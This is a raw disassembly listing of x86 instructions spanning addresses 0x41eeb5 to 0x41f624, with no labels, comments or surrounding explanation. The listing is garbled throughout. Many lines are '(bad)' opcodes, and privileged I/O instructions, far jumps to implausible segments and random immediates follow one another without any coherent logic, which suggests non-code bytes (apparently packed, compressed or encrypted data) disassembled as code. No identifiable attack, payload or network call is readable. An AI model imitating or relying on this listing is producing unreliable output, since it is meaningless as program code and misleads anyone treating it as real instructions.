  41eeb5:	dec    esi
  41eeb6:	or     BYTE PTR [ecx+eax*2-0x68d02f2c],dh
  41eebd:	pop    esi
  41eebe:	loope  0x41ee6c
  41eec0:	es jmp 0x41ee48
  41eec3:	adc    dl,BYTE PTR [ecx]
  41eec5:	out    0xfc,eax
  41eec7:	ins    BYTE PTR es:[edi],dx
  41eec8:	xor    cl,dh
  41eeca:	cmp    al,BYTE PTR [ebp+0x24]
  41eecd:	mov    bh,0x6d
  41eecf:	into   
  41eed0:	(bad)  
  41eed1:	and    BYTE PTR [ebx],ch
  41eed3:	push   edi
  41eed4:	mov    cl,0x47
  41eed6:	xlat   BYTE PTR ds:[ebx]
  41eed7:	nop
  41eed8:	dec    ebx
  41eed9:	add    al,0x8c
  41eedb:	cmp    eax,ebp
  41eedd:	and    eax,0xa83db543
  41eee2:	cli    
  41eee3:	scas   al,BYTE PTR es:[edi]
  41eee4:	add    BYTE PTR [ecx+ebx*4+0x624491d2],dh
  41eeeb:	and    ebx,eax
  41eeed:	inc    edi
  41eeee:	inc    esi
  41eeef:	repz or eax,0xe921666c
  41eef5:	frstor [eax]
  41eef7:	push   edx
  41eef8:	xor    dh,0xf7
  41eefb:	cmp    dl,BYTE PTR [edi]
  41eefd:	mov    bl,0x33
  41eeff:	xchg   ebx,eax
  41ef00:	add    eax,0x93fc93c5
  41ef05:	mov    esp,0x40612da7
  41ef0a:	adc    bl,BYTE PTR [ebx+0x7d]
  41ef0d:	sbb    al,0x27
  41ef0f:	addr16 adc eax,0xe3ee182c
  41ef15:	jmp    0x41eedc
  41ef17:	jg     0x41ef73
  41ef19:	into   
  41ef1a:	push   0x13
  41ef1c:	daa    
  41ef1d:	adc    BYTE PTR [eax+edx*1],dl
  41ef20:	sub    eax,0x7a72f886
  41ef25:	retf   0x1d49
  41ef28:	es fst QWORD PTR gs:[esi+0x42]
  41ef2d:	push   edx
  41ef2e:	mov    ds:0x953c7985,eax
  41ef33:	jo     0x41ef5a
  41ef35:	sub    DWORD PTR [esi],edx
  41ef37:	inc    edi
  41ef38:	shr    BYTE PTR [eax],1
  41ef3a:	enter  0x684c,0xd9
  41ef3e:	mov    esp,0xefb1c7c4
  41ef43:	xchg   edx,eax
  41ef44:	push   ds
  41ef45:	xchg   edi,eax
  41ef46:	jnp    0x41ef2f
  41ef48:	jl     0x41ef9d
  41ef4a:	loope  0x41ef3f
  41ef4c:	push   es
  41ef4d:	retf   0x6875
  41ef50:	add    ebx,DWORD PTR [esi-0x4016e19c]
  41ef56:	sti    
  41ef57:	into   
  41ef58:	daa    
  41ef59:	test   WORD PTR [ebx-0x23],dx
  41ef5d:	push   ebx
  41ef5e:	adc    eax,DWORD PTR [eax+0x8a2f45a]
  41ef64:	push   ebx
  41ef65:	pusha  
  41ef66:	lahf   
  41ef67:	cmp    ecx,DWORD PTR [edx]
  41ef69:	clc    
  41ef6a:	sub    DWORD PTR [ebp+eax*2+0x4db221b5],ebx
  41ef71:	jp     0x41eef8
  41ef73:	inc    ebp
  41ef74:	enter  0xe45b,0xea
  41ef78:	pop    eax
  41ef79:	push   esi
  41ef7a:	sub    DWORD PTR [ecx+0x74],ebp
  41ef7d:	cmc    
  41ef7e:	xor    DWORD PTR [edi],edi
  41ef80:	imul   eax,DWORD PTR [edx],0x94928495
  41ef86:	in     eax,dx
  41ef87:	jnp    0x41efc7
  41ef89:	inc    ebx
  41ef8a:	cs xchg ebp,eax
  41ef8c:	dec    ebx
  41ef8d:	and    edi,0x38e938f0
  41ef93:	imul   ecx,DWORD PTR [ebp*4+0x588048e7],0xffffffaf
  41ef9b:	lea    edi,[ebx+ebx*1+0x29]
  41ef9f:	pop    edi
  41efa0:	jge    0x41eff2
  41efa2:	jmp    0xb0c8:0xa0e62530
  41efa9:	jmp    0x41ef5d
  41efab:	cmp    eax,0x99c18846
  41efb0:	cmp    al,0x47
  41efb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efb3:	stc    
  41efb4:	push   ebx
  41efb5:	or     DWORD PTR [ecx-0x35a58893],0x52def55
  41efbf:	icebp  
  41efc0:	out    dx,eax
  41efc1:	test   ecx,esi
  41efc3:	pop    edx
  41efc4:	push   ds
  41efc5:	push   edx
  41efc6:	and    DWORD PTR [ecx],ecx
  41efc8:	clc    
  41efc9:	add    esp,DWORD PTR [eax]
  41efcb:	lock mov cl,0x30
  41efce:	addr16 push ebp
  41efd0:	mov    WORD PTR [esi-0x4be85466],es
  41efd6:	clc    
  41efd7:	cmp    dh,dl
  41efd9:	es pop ecx
  41efdb:	scas   eax,DWORD PTR es:[edi]
  41efdc:	cmp    ecx,DWORD PTR [ecx-0x717488e8]
  41efe2:	rcr    DWORD PTR [edi+0x17119a98],cl
  41efe8:	shrd   DWORD PTR [ecx+ecx*8+0x5d],eax,cl
  41efed:	scas   eax,DWORD PTR es:[edi]
  41efee:	push   edi
  41efef:	lock mov ds,edi
  41eff2:	enter  0xbe9d,0xd2
  41eff6:	add    al,0xbf
  41eff8:	inc    ecx
  41eff9:	enter  0xbb1c,0xc4
  41effd:	cs popf 
  41efff:	(bad)  
  41f000:	push   ebp
  41f001:	hlt    
  41f002:	mov    BYTE PTR [ecx],dl
  41f004:	adc    al,0xb0
  41f006:	fst    DWORD PTR [ebx]
  41f008:	loop   0x41f03a
  41f00a:	or     eax,0xba1f5df1
  41f00f:	out    dx,al
  41f010:	and    BYTE PTR [ebx+0x3bdd0434],cl
  41f016:	xchg   BYTE PTR [esi-0x12],bh
  41f019:	xor    al,0x28
  41f01b:	fild   DWORD PTR [ecx+edi*1-0x46b650f7]
  41f022:	lock mov dl,0xf
  41f025:	add    cl,ch
  41f027:	jl     0x41f034
  41f029:	sub    al,0x27
  41f02b:	loop   0x41f019
  41f02d:	xchg   edi,eax
  41f02e:	or     BYTE PTR [edx],dh
  41f030:	std    
  41f031:	dec    esp
  41f032:	hlt    
  41f033:	pop    esp
  41f034:	adc    ah,BYTE PTR [ebp+0x13]
  41f037:	pop    ecx
  41f038:	pop    eax
  41f039:	adc    al,0x49
  41f03b:	cmp    edi,DWORD PTR [ebx-0x53]
  41f03e:	repz aaa 
  41f040:	aas    
  41f041:	gs jmp 0x41f084
  41f044:	inc    edi
  41f045:	mov    ebx,ebp
  41f047:	int3   
  41f048:	rol    BYTE PTR [ecx],1
  41f04a:	test   dl,cl
  41f04c:	outs   dx,DWORD PTR ds:[esi]
  41f04d:	sub    cl,bl
  41f04f:	scas   al,BYTE PTR es:[edi]
  41f050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f051:	pop    esp
  41f052:	test   eax,0x25d1011f
  41f057:	fld    TBYTE PTR [ecx]
  41f059:	clc    
  41f05a:	and    eax,0x92bc64ce
  41f05f:	pop    eax
  41f060:	inc    ebx
  41f061:	ds mov dh,0x53
  41f064:	out    dx,al
  41f065:	xor    edi,ecx
  41f067:	(bad)  
  41f068:	adc    ebp,ebx
  41f06a:	leave  
  41f06b:	repnz mov edi,ebx
  41f06e:	add    eax,0x7b5b69c7
  41f073:	sbb    eax,0xe84a4c65
  41f078:	sar    bl,cl
  41f07a:	mov    ch,0xf4
  41f07c:	push   0xfffffff0
  41f07e:	test   al,0xd8
  41f080:	push   eax
  41f081:	iret   
  41f082:	jl     0x41f0a4
  41f084:	js     0x41f072
  41f086:	inc    ecx
  41f087:	shr    dl,1
  41f089:	ins    BYTE PTR es:[edi],dx
  41f08a:	cs loop 0x41f00d
  41f08d:	xchg   ebp,eax
  41f08e:	adc    ah,BYTE PTR [eax+0x6c171602]
  41f094:	and    DWORD PTR [esi-0x5088f9a7],edi
  41f09a:	repnz inc ebp
  41f09c:	mov    ecx,0x43d81fef
  41f0a1:	xchg   ebp,eax
  41f0a2:	sub    eax,0xea7d7ab5
  41f0a7:	adc    al,dl
  41f0a9:	popa   
  41f0aa:	daa    
  41f0ab:	lds    esi,FWORD PTR [edi-0x3c]
  41f0ae:	sub    DWORD PTR [edx-0x73],ecx
  41f0b1:	or     BYTE PTR [edx-0x3756125a],cl
  41f0b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0b8:	pop    esp
  41f0b9:	jae    0x41f085
  41f0bb:	or     eax,0xc93fb405
  41f0c0:	test   esi,ebx
  41f0c2:	sub    al,0x91
  41f0c4:	inc    edx
  41f0c5:	fdivr  QWORD PTR [ebx-0x26]
  41f0c8:	xchg   edi,eax
  41f0c9:	scas   eax,DWORD PTR es:[edi]
  41f0ca:	aaa    
  41f0cb:	sbb    al,0xf8
  41f0cd:	xchg   ecx,eax
  41f0ce:	mov    edi,0xd42e2770
  41f0d3:	in     al,dx
  41f0d4:	inc    edx
  41f0d5:	mov    dh,BYTE PTR [edi+ebx*8]
  41f0d8:	scas   al,BYTE PTR es:[edi]
  41f0d9:	or     eax,0xa7ca9620
  41f0de:	in     eax,0xf9
  41f0e0:	push   ebp
  41f0e1:	dec    ebx
  41f0e2:	add    BYTE PTR [ecx+0x4312b8f7],bh
  41f0e8:	cmp    BYTE PTR [edi+esi*4+0xb],cl
  41f0ec:	fsubr  st(4),st
  41f0ee:	hlt    
  41f0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0f0:	inc    ebx
  41f0f1:	mov    WORD PTR [edi+esi*8-0x6682e89b],gs
  41f0f8:	pop    eax
  41f0f9:	dec    ebp
  41f0fa:	push   es
  41f0fb:	push   0xc34d08ed
  41f100:	jo     0x41f113
  41f102:	lods   eax,DWORD PTR ds:[esi]
  41f103:	repz add BYTE PTR [ecx-0x3a],cl
  41f107:	adc    BYTE PTR [edx-0x47],dh
  41f10a:	cmp    al,0x40
  41f10c:	mov    bh,0xb7
  41f10e:	xor    DWORD PTR [ebp+0x61],0xffffffd5
  41f112:	retf   
  41f113:	xlat   BYTE PTR ds:[ebx]
  41f114:	mov    ah,0xd1
  41f116:	aaa    
  41f117:	(bad)  
  41f118:	jmp    0x139b74bb
  41f11d:	outs   dx,DWORD PTR ds:[esi]
  41f11e:	test   al,0xec
  41f120:	in     eax,0x45
  41f122:	pushf  
  41f123:	aad    0xa6
  41f125:	push   ecx
  41f126:	mov    ds:0x3818e082,al
  41f12b:	(bad)  
  41f12c:	fidivr DWORD PTR [edx]
  41f12e:	mov    edi,DWORD PTR [esi+0x79]
  41f131:	sbb    eax,0xfa4d473a
  41f136:	sbb    al,0x0
  41f138:	retf   0xb201
  41f13b:	and    eax,0xfa1e7752
  41f140:	jl     0x41f0fe
  41f142:	jle    0x41f128
  41f144:	mov    edi,0x120265f
  41f149:	mov    ebx,0x460fa299
  41f14e:	xor    al,0x67
  41f150:	outs   dx,BYTE PTR ds:[esi]
  41f151:	inc    edi
  41f152:	jecxz  0x41f124
  41f154:	dec    ebp
  41f155:	push   edi
  41f156:	mov    cs,WORD PTR [ecx+ecx*1]
  41f159:	imul   edx,edx,0xffffffce
  41f15c:	push   edi
  41f15d:	and    eax,0x429b605e
  41f162:	cmp    al,0x77
  41f164:	inc    ecx
  41f165:	pop    ss
  41f166:	(bad)
  41f16a:	ret    0xadd4
  41f16d:	mov    dl,0xe3
  41f16f:	lds    edx,FWORD PTR [ecx]
  41f171:	in     al,dx
  41f172:	(bad)  
  41f173:	int3   
  41f174:	jbe    0x41f108
  41f176:	inc    esp
  41f177:	xlat   BYTE PTR ss:[ebx]
  41f179:	jle    0x41f1a4
  41f17b:	scas   eax,DWORD PTR es:[edi]
  41f17c:	xor    BYTE PTR [eax+esi*4],0x75
  41f180:	aaa    
  41f181:	xchg   DWORD PTR [ebx+ebx*2],edx
  41f184:	adc    eax,0x305143dd
  41f189:	add    BYTE PTR [ebp+0x73],0x78
  41f18d:	imul   esp,eax,0xa7b9f943
  41f193:	fucom  st(3)
  41f195:	enter  0x2128,0xbb
  41f199:	in     eax,dx
  41f19a:	out    0xdc,al
  41f19c:	dec    ecx
  41f19d:	xchg   BYTE PTR [esi-0x55976395],bl
  41f1a3:	mov    dh,0x82
  41f1a5:	or     eax,0x5a0f26fc
  41f1aa:	jb     0x41f1e0
  41f1ac:	mov    eax,ds:0x60015805
  41f1b1:	push   0xb3589169
  41f1b6:	sbb    al,0x98
  41f1b8:	xchg   BYTE PTR [edx+0x6c],al
  41f1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1bc:	mov    bh,0xc1
  41f1be:	sub    eax,0xb0f2c27c
  41f1c3:	ret    
  41f1c4:	mov    ebx,0x789a937c
  41f1c9:	(bad)  
  41f1ca:	repnz outs dx,DWORD PTR ds:[esi]
  41f1cc:	ror    DWORD PTR [edx+0x73],0x86
  41f1d0:	retf   0xefb6
  41f1d3:	mov    eax,ds:0x7302788b
  41f1d8:	loopne 0x41f21a
  41f1da:	in     al,dx
  41f1db:	sub    edi,DWORD PTR [edx]
  41f1dd:	sbb    BYTE PTR [eax-0x18],bl
  41f1e0:	jmp    0x97b:0xbb9b043a
  41f1e7:	xchg   edi,eax
  41f1e8:	ds pop ecx
  41f1ea:	cld    
  41f1eb:	(bad)  
  41f1ec:	sbb    eax,0x1480ad0f
  41f1f1:	lea    ecx,[ebx+esi*2+0x2f243f5b]
  41f1f8:	aad    0xbf
  41f1fa:	lea    edx,[bx+di+0xd9b]
  41f1ff:	inc    esi
  41f200:	sar    esi,1
  41f202:	hlt    
  41f203:	jne    0x41f1a0
  41f205:	sbb    eax,DWORD PTR [ebp-0x3b80ffec]
  41f20b:	mov    ecx,0x3615949
  41f210:	dec    esp
  41f211:	sub    dl,al
  41f213:	shr    DWORD PTR [eax-0x5],cl
  41f216:	push   ebx
  41f217:	jne    0x41f28f
  41f219:	inc    ebp
  41f21a:	adc    esp,DWORD PTR ss:[edi]
  41f21d:	lds    ebx,FWORD PTR [esi-0xd99d74a]
  41f223:	xchg   ebx,eax
  41f224:	bound  edx,QWORD PTR [esi]
  41f226:	add    eax,0x3cf656d2
  41f22b:	lods   al,BYTE PTR ds:[esi]
  41f22c:	sbb    al,0x74
  41f22e:	leave  
  41f22f:	ds jl  0x41f1c1
  41f232:	xor    al,0xc0
  41f234:	fld    QWORD PTR [ebp-0x11]
  41f237:	inc    eax
  41f238:	inc    edi
  41f239:	mov    bh,0xb1
  41f23b:	fyl2xp1 
  41f23d:	int3   
  41f23e:	stc    
  41f23f:	dec    ebx
  41f240:	jg     0x41f223
  41f242:	scas   al,BYTE PTR es:[edi]
  41f243:	or     DWORD PTR [eax],esi
  41f245:	sub    DWORD PTR [esi+0x55aba040],ebp
  41f24b:	jo     0x41f272
  41f24d:	clc    
  41f24e:	or     eax,edi
  41f250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f251:	fmul   QWORD PTR [edx-0x2ad554fe]
  41f257:	or     eax,0x8cf294c8
  41f25c:	cmp    BYTE PTR ds:0xfe008f39,bh
  41f262:	out    dx,al
  41f263:	cs js  0x41f265
  41f266:	pop    es
  41f267:	fld    TBYTE PTR [edx+0x42]
  41f26a:	push   ss
  41f26b:	ins    BYTE PTR es:[edi],dx
  41f26c:	add    eax,0x689999b7
  41f271:	stc    
  41f272:	in     eax,dx
  41f273:	xchg   edx,eax
  41f274:	sub    DWORD PTR [ebp+0x13dc150c],edi
  41f27a:	(bad)  
  41f27c:	retf   0x9baa
  41f27f:	adc    ecx,DWORD PTR [ebp-0x47d6db88]
  41f285:	push   esp
  41f286:	sahf   
  41f287:	push   ebp
  41f288:	mov    bl,0xe1
  41f28a:	mov    edx,0x6a6c0df8
  41f28f:	test   BYTE PTR [ebx],0xad
  41f292:	inc    ebx
  41f293:	and    al,0x1b
  41f295:	call   0x4ba9:0x577e860c
  41f29c:	jecxz  0x41f2d9
  41f29e:	(bad)  
  41f29f:	ror    DWORD PTR [edi-0x50],cl
  41f2a2:	pop    edx
  41f2a3:	es out 0x9,al
  41f2a6:	cmp    dl,cl
  41f2a8:	add    al,0x89
  41f2aa:	cwde   
  41f2ab:	fcom   DWORD PTR [ebp+edx*1+0x26]
  41f2af:	dec    ecx
  41f2b0:	and    bh,0xaf
  41f2b3:	mov    eax,ds:0x25aa9fc3
  41f2b8:	sbb    BYTE PTR [ecx+ebp*8-0x2f526519],dh
  41f2bf:	mov    dl,0x79
  41f2c1:	pop    es
  41f2c2:	mov    DWORD PTR [edi-0x6e38a2ba],esp
  41f2c8:	test   al,0x16
  41f2ca:	in     al,0x25
  41f2cc:	ins    DWORD PTR es:[di],dx
  41f2ce:	stos   DWORD PTR es:[edi],eax
  41f2cf:	int3   
  41f2d0:	pop    ds
  41f2d1:	pop    eax
  41f2d2:	ss ja  0x41f314
  41f2d5:	jns    0x41f2af
  41f2d7:	(bad)  
  41f2d8:	cmc    
  41f2d9:	fwait
  41f2da:	out    dx,eax
  41f2db:	rol    ah,0x34
  41f2de:	cmp    eax,0xe515f41a
  41f2e3:	test   eax,0xbd79848c
  41f2e8:	js     0x41f30a
  41f2ea:	les    esp,FWORD PTR [edi]
  41f2ec:	popf   
  41f2ed:	push   ebp
  41f2ee:	or     DWORD PTR [ebx+eax*2],0x1d7ccc8f
  41f2f5:	(bad)  
  41f2f6:	adc    dh,ah
  41f2f8:	and    DWORD PTR [ebp+0x7087a9a0],0x6a
  41f2ff:	test   DWORD PTR [ecx+esi*2+0x62c58be4],ebp
  41f306:	std    
  41f307:	and    eax,0xc4d1b6f6
  41f30c:	addr16 retf 0xcc55
  41f310:	add    DWORD PTR [esi-0x4d],esi
  41f313:	sti    
  41f314:	lea    ebx,[ebx-0x28]
  41f317:	push   ecx
  41f318:	sbb    BYTE PTR [edx],0xae
  41f31b:	mov    BYTE PTR [esi+0x780696f2],al
  41f321:	sbb    ch,BYTE PTR [eax+0x8903b7e]
  41f327:	adc    DWORD PTR [edx+edi*1],esp
  41f32a:	push   edx
  41f32b:	cmp    dh,BYTE PTR [edi+0x6]
  41f32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f32f:	mov    ch,0x3a
  41f331:	sub    DWORD PTR [edx+ecx*8],0x7bb53d2c
  41f338:	rcr    bh,cl
  41f33a:	mov    edi,0x3375e2f9
  41f33f:	push   ebp
  41f340:	cwde   
  41f341:	(bad)  
  41f343:	aaa    
  41f344:	or     BYTE PTR [ebx],al
  41f346:	lds    esp,FWORD PTR ss:[esi-0x6d]
  41f34a:	xchg   ecx,eax
  41f34b:	or     BYTE PTR [eax+esi*8-0x4b],bh
  41f34f:	push   0x31
  41f351:	shl    DWORD PTR [ebx+eiz*1],0xe6
  41f355:	cmp    al,0x6e
  41f357:	(bad)  
  41f359:	add    eax,0x79041194
  41f35e:	fsubr  DWORD PTR [ebx]
  41f360:	cli    
  41f361:	pop    edx
  41f362:	pusha  
  41f363:	sbb    eax,DWORD PTR [edi+ebp*1-0x2e]
  41f367:	dec    ebx
  41f368:	push   ds
  41f369:	mov    bh,0xd0
  41f36b:	dec    edi
  41f36c:	dec    eax
  41f36d:	xchg   BYTE PTR [edx+0x4e],al
  41f370:	jo     0x41f39e
  41f372:	sbb    bh,al
  41f374:	and    cl,ah
  41f376:	jmp    0xe9da054
  41f37b:	int3   
  41f37c:	add    al,0xb1
  41f37e:	jle    0x41f392
  41f380:	lods   eax,DWORD PTR ds:[esi]
  41f381:	xchg   edi,eax
  41f382:	mov    ds,WORD PTR [edi-0xabe1813]
  41f388:	ins    DWORD PTR es:[edi],dx
  41f389:	cli    
  41f38a:	adc    esp,ecx
  41f38c:	stos   DWORD PTR es:[edi],eax
  41f38d:	pop    ebp
  41f38e:	mov    ss,WORD PTR [esi]
  41f390:	out    dx,al
  41f391:	dec    eax
  41f392:	mov    esi,0xee0eac9f
  41f397:	ins    BYTE PTR es:[edi],dx
  41f398:	adc    eax,0x60e54bd8
  41f39d:	push   esp
  41f39e:	mov    ds:0xa96e0e03,eax
  41f3a3:	(bad)  
  41f3a4:	push   ss
  41f3a5:	push   0x2b97b9c4
  41f3aa:	dec    esi
  41f3ab:	xchg   ecx,eax
  41f3ac:	scas   eax,DWORD PTR es:[edi]
  41f3ad:	imul   eax,eax,0x23903732
  41f3b3:	leave  
  41f3b4:	and    edi,DWORD PTR [edi]
  41f3b6:	pushf  
  41f3b7:	xchg   edi,eax
  41f3b8:	sub    al,0xf2
  41f3ba:	retf   0x6dcf
  41f3bd:	fstp   st(5)
  41f3bf:	mov    esi,0x3749e656
  41f3c4:	loopne 0x41f3c4
  41f3c6:	out    dx,al
  41f3c7:	lea    esp,[edx*4-0x226c37ce]
  41f3ce:	adc    ebx,0x93ceb934
  41f3d4:	pusha  
  41f3d5:	sti    
  41f3d6:	inc    eax
  41f3d7:	jae    0x41f443
  41f3d9:	add    eax,0xcc7bc7a1
  41f3de:	mov    ch,0xd5
  41f3e0:	nop
  41f3e1:	out    dx,eax
  41f3e2:	out    0x1a,eax
  41f3e4:	xchg   ebp,eax
  41f3e5:	cmp    al,0x26
  41f3e7:	gs and eax,edx
  41f3ea:	xchg   cl,dl
  41f3ec:	iret   
  41f3ed:	fiadd  WORD PTR [edi]
  41f3ef:	xor    ah,ch
  41f3f1:	leave  
  41f3f2:	pop    ds
  41f3f3:	cmp    DWORD PTR [ecx],edx
  41f3f5:	in     al,dx
  41f3f6:	(bad)  
  41f3f7:	mov    ebx,esp
  41f3f9:	sbb    BYTE PTR [ebp-0x10],bl
  41f3fc:	and    al,0x8f
  41f3fe:	xor    eax,0x7c0bf71e
  41f403:	or     esp,DWORD PTR [edx-0x6b2094b7]
  41f409:	ja     0x41f3e0
  41f40b:	xor    BYTE PTR [edx],dh
  41f40d:	xchg   esi,eax
  41f40e:	lea    eax,[edx+0x6324d47c]
  41f414:	pop    edx
  41f415:	sub    al,ah
  41f417:	popa   
  41f418:	or     eax,0xa89ef9b7
  41f41d:	fmul   DWORD PTR [eax]
  41f41f:	(bad)
  41f422:	outs   dx,BYTE PTR ds:[esi]
  41f423:	into   
  41f424:	fistp  WORD PTR [ebx-0x4a]
  41f427:	int    0xd
  41f429:	or     esp,DWORD PTR [eax]
  41f42b:	aam    0x50
  41f42d:	aam    0x3e
  41f42f:	stos   BYTE PTR es:[edi],al
  41f430:	fwait
  41f431:	loop   0x41f3b7
  41f433:	add    cl,dh
  41f435:	enter  0xc346,0xc7
  41f439:	pop    ds
  41f43a:	jbe    0x41f3cc
  41f43c:	xchg   edx,eax
  41f43d:	nop
  41f43e:	(bad)  
  41f43f:	dec    ecx
  41f440:	js     0x41f3c6
  41f442:	or     DWORD PTR [esp+ebx*2],edi
  41f445:	or     DWORD PTR [eax+0x10],edi
  41f448:	outs   dx,DWORD PTR ds:[esi]
  41f449:	mov    eax,0xb16404e5
  41f44e:	jl     0x41f445
  41f450:	or     al,0xe6
  41f452:	adc    cl,BYTE PTR [ebp+eiz*4+0x5a]
  41f456:	dec    esi
  41f457:	rcl    DWORD PTR [edx],cl
  41f459:	sbb    eax,0xda86c563
  41f45e:	repnz bound edx,QWORD PTR [ebx-0x58]
  41f462:	mov    ah,0xab
  41f464:	push   edi
  41f465:	nop
  41f466:	and    cl,al
  41f468:	push   eax
  41f469:	xor    DWORD PTR [ebx+0x44],edi
  41f46c:	inc    ecx
  41f46d:	xor    ebx,DWORD PTR [ecx+0x6c981f86]
  41f473:	repz or dh,dh
  41f476:	or     eax,0xf10b2426
  41f47b:	popf   
  41f47c:	or     DWORD PTR [ebx-0x7ecca489],edx
  41f482:	stc    
  41f483:	ret    0x6663
  41f486:	adc    bh,cl
  41f488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f489:	icebp  
  41f48a:	test   al,0xad
  41f48c:	jnp    0x41f4b3
  41f48e:	or     eax,0xa8673c82
  41f493:	fyl2x  
  41f495:	sbb    BYTE PTR [edx],al
  41f497:	adc    cl,BYTE PTR ds:0x11a214e9
  41f49d:	mov    ch,ah
  41f49f:	ret    
  41f4a0:	rcl    BYTE PTR [ecx+0x82e62e8],0x2e
  41f4a7:	mov    ah,0x7a
  41f4a9:	add    ch,BYTE PTR [ebx]
  41f4ab:	pop    ecx
  41f4ac:	mov    ecx,edi
  41f4ae:	mov    eax,ds:0x88bce634
  41f4b3:	mov    esi,0xd871662d
  41f4b8:	or     BYTE PTR [esi+0x16282466],bh
  41f4be:	inc    eax
  41f4bf:	inc    ebp
  41f4c0:	call   0x48173861
  41f4c5:	in     al,dx
  41f4c6:	(bad)  
  41f4c7:	in     al,dx
  41f4c8:	lahf   
  41f4c9:	rcr    BYTE PTR [esp+ecx*2+0x59505103],cl
  41f4d0:	xor    ch,dh
  41f4d2:	xor    eax,ebp
  41f4d4:	or     DWORD PTR [eax],edi
  41f4d6:	out    dx,eax
  41f4d7:	dec    ecx
  41f4d8:	cli    
  41f4d9:	xchg   esp,eax
  41f4da:	retf   0x4b28
  41f4dd:	xchg   ecx,eax
  41f4de:	fcom   QWORD PTR [ecx+0x3f26900f]
  41f4e4:	iret   
  41f4e5:	jne    0x41f547
  41f4e7:	jns    0x41f4fe
  41f4e9:	jmp    0x58c58e6c
  41f4ee:	cmc    
  41f4ef:	mov    cl,0xc7
  41f4f1:	push   esp
  41f4f2:	pop    esi
  41f4f3:	lock sub ecx,DWORD PTR [esi]
  41f4f6:	jp     0x41f491
  41f4f8:	mov    ah,0x21
  41f4fa:	push   cs
  41f4fb:	cmp    BYTE PTR [esi+eiz*1+0x76152ec],0x4
  41f503:	retf   0xe361
  41f506:	jg     0x41f4f0
  41f508:	ror    ah,1
  41f50a:	mov    ss,eax
  41f50c:	loope  0x41f4e9
  41f50e:	xor    edx,esp
  41f510:	dec    edi
  41f511:	add    cl,dh
  41f513:	jne    0x41f4c2
  41f515:	mov    DWORD PTR [edx+0x7c7f8eb5],ebp
  41f51b:	repz out dx,al
  41f51d:	sub    esi,DWORD PTR [eax-0x46b0ed8]
  41f523:	mov    al,ds:0x5b8b94b6
  41f528:	lock in al,0x50
  41f52b:	repnz fisubr DWORD PTR [ebx-0xf]
  41f52f:	inc    ebx
  41f530:	test   DWORD PTR [eax+0x7076e1a0],esi
  41f536:	cld    
  41f537:	jbe    0x41f4d8
  41f539:	jmp    0x41f506
  41f53b:	or     al,0x0
  41f53d:	mov    esp,0xa9d25d95
  41f542:	out    0xaa,eax
  41f544:	add    eax,0xbc983ee9
  41f549:	pop    esp
  41f54a:	and    al,0xf1
  41f54c:	push   ecx
  41f54d:	sahf   
  41f54e:	scas   al,BYTE PTR es:[edi]
  41f54f:	adc    edx,DWORD PTR [edx+0x35]
  41f552:	mov    ah,0x7a
  41f554:	imul   ebp,DWORD PTR [edi+0x1064e630],0xffffffa8
  41f55b:	push   ebx
  41f55c:	mov    esp,0x2c372d85
  41f561:	nop
  41f562:	mov    edi,DWORD PTR [ebp-0x3318f6ee]
  41f568:	or     eax,0xabd3f49f
  41f56d:	fisttp DWORD PTR [edx+eiz*1-0x12fcca10]
  41f574:	jo     0x41f514
  41f576:	pop    ebx
  41f577:	int    0x93
  41f579:	ins    BYTE PTR es:[edi],dx
  41f57a:	sub    al,BYTE PTR [ebx-0x619d552f]
  41f580:	sbb    DWORD PTR [ecx],0x82df1070
  41f586:	std    
  41f587:	scas   al,BYTE PTR es:[edi]
  41f588:	mov    DWORD PTR [esi+0x64a87110],esi
  41f58e:	imul   ebx,DWORD PTR [ecx],0xf59d5ab
  41f594:	inc    ebp
  41f595:	sub    eax,0xb9210630
  41f59b:	dec    esi
  41f59c:	pusha  
  41f59d:	mov    bl,0xa9
  41f59f:	sub    al,0x6d
  41f5a1:	daa    
  41f5a2:	or     BYTE PTR [eax-0x64],bh
  41f5a5:	sub    BYTE PTR [eax],dh
  41f5a7:	jl     0x41f586
  41f5a9:	pushf  
  41f5aa:	xchg   ecx,eax
  41f5ab:	xor    DWORD PTR [ebp+esi*8-0x4],esp
  41f5af:	std    
  41f5b0:	fwait
  41f5b1:	dec    esp
  41f5b2:	xchg   esp,eax
  41f5b3:	sbb    DWORD PTR [edx+0x0],esp
  41f5b6:	add    al,BYTE PTR [esi+0x544a5d18]
  41f5bc:	sbb    al,0x3e
  41f5be:	loope  0x41f601
  41f5c0:	xchg   bp,ax
  41f5c2:	xor    ebp,DWORD PTR es:[eax+edx*8]
  41f5c6:	(bad)  
  41f5c7:	mov    ah,0x4a
  41f5c9:	in     eax,dx
  41f5ca:	lods   al,BYTE PTR ds:[esi]
  41f5cb:	cli    
  41f5cc:	cmp    eax,0x2aad8f65
  41f5d1:	pop    ss
  41f5d2:	mov    eax,ds:0x25cf3587
  41f5d7:	pop    esp
  41f5d8:	push   es
  41f5d9:	loop   0x41f658
  41f5db:	test   DWORD PTR [edx-0x79dce2e4],ebx
  41f5e1:	mov    DWORD PTR [ebp+0x3aefa096],esi
  41f5e7:	imul   edx,ecx,0x56
  41f5ea:	popf   
  41f5eb:	daa    
  41f5ec:	test   BYTE PTR [ebp-0x10],0x4c
  41f5f0:	dec    eax
  41f5f1:	test   al,0x8c
  41f5f3:	mov    DWORD PTR [ebx-0x4d8dd5d],ecx
  41f5f9:	push   esi
  41f5fa:	data16 jecxz 0x41f5c8
  41f5fd:	mov    esi,0x34327689
  41f602:	leave  
  41f603:	or     al,0xb9
  41f605:	dec    ecx
  41f606:	mov    ah,0x1f
  41f608:	fwait
  41f609:	push   ds
  41f60a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f60d:	and    ecx,DWORD PTR [eax+0x5a4ed38a]
  41f613:	(bad)  
  41f614:	aas    
  41f615:	inc    ebp
  41f616:	mov    bl,0x91
  41f618:	(bad)  
  41f61a:	fwait
  41f61b:	popf   
  41f61c:	dec    esi
  41f61d:	mov    ds:0x3ac00593,al
  41f622:	pop    ss
  41f623:	pop    ebx
  41f624:	and    BYTE PTR [edx-0x7b],bh
